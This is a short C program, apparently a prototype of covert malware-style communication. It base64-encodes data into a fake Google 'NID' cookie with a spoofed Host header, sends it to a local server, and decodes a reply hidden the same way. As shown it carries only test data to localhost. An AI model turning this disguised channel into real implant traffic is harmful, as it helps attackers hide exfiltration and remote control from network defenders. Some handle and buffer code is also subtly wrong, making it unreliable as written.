#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <stdio.h>

VOID main(VOID) {
    HINTERNET inet = InternetOpenA(
                        "win32",
                        INTERNET_OPEN_TYPE_DIRECT,
                        NULL,
                        NULL,
                        0);

    HINTERNET conn = InternetConnectA(
                        inet,
                        "127.0.0.1",
                        8080,
                        NULL,
                        NULL,
                        INTERNET_SERVICE_HTTP,
                        0,
                        0);

    PCSTR accept_types[] = {"text/html", "application/xhtml+xml", "application/xml", NULL};

    HINTERNET request = HttpOpenRequestA(
                            conn,
                            "GET",
                            "/test",
                            "HTTP/1.1",
                            "www.google.com",
                            accept_types,
                            INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES,
                            0);

    HttpAddRequestHeadersA(
        request,
        "Host: www.google.com\r\n",
        (DWORD)-1L,
        HTTP_ADDREQ_FLAG_REPLACE);

    PSTR data = "test data";
    DWORD data_len = strlen(data);
    DWORD data_b64_len = data_len * 2;
    PSTR data_b64 = malloc(data_b64_len);

    CryptBinaryToStringA(
        (PBYTE)data,
        data_len,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        data_b64,
        &data_b64_len);

    PSTR cookie_header = "Cookie: NID=";
    PSTR cookie_tail = "; path=/; domain=.google.com; Secure\r\n";

    DWORD cookie_len = strlen(cookie_header) + strlen(cookie_tail) + data_b64_len + 1;
    PSTR cookie = malloc(cookie_len);

    sprintf_s(cookie, cookie_len, "%s%s%s", cookie_header, data_b64, cookie_tail);

    HttpSendRequestA(request, cookie, (DWORD)-1L, 0, 0);

    free(data_b64);
    free(cookie);

    DWORD status_code;
    DWORD temp = sizeof(status_code);

    HttpQueryInfoA(
        request,
        HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        &status_code,
        &temp,
        0);

    DWORD content_len;
    temp = sizeof(content_len);

    HttpQueryInfoA(
        request,
        HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
        &content_len,
        &temp,
        0);

    printf("status: %ld len: %ld\n", status_code, content_len);

    PSTR buff = malloc(content_len + 1);
    DWORD bytes_read;

    InternetReadFile(request, buff, content_len, &bytes_read);

    buff[bytes_read] = '\0';

    //printf("read(%d):\n%s\n", bytes_read, buff);

    cookie = NULL;
    cookie_len = 0;

    // 0 len buff will write back the required size
    HttpQueryInfoA(request, HTTP_QUERY_SET_COOKIE, cookie, &cookie_len, 0);

    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        cookie = malloc(++cookie_len);

        if ( HttpQueryInfoA(request, HTTP_QUERY_SET_COOKIE, cookie, &cookie_len, 0) ) {

            cookie[cookie_len] = '\0';

            //doesn't account for multiple KV pairs in Set-Cookie header
            PSTR token1 = strtok(cookie, "=");
            PSTR token2 = strtok(NULL, "=");

            if (strcmp(token1, "NID") == 0 && token2 != NULL) {
                data_b64_len = strlen(token2);

                PSTR decoded_data = malloc(data_b64_len);
                DWORD decoded_len = data_b64_len;

                CryptStringToBinaryA(
                    token2,
                    data_b64_len,
                    CRYPT_STRING_BASE64,
                    (PBYTE)decoded_data,
                    &decoded_len,
                    NULL,
                    NULL);

                decoded_data[decoded_len] = '\0';

                printf("%s\n", decoded_data);
            }
        }
        free(cookie);
        cookie = NULL;
    }

    CloseHandle(inet);
    CloseHandle(conn);
    CloseHandle(request);
}
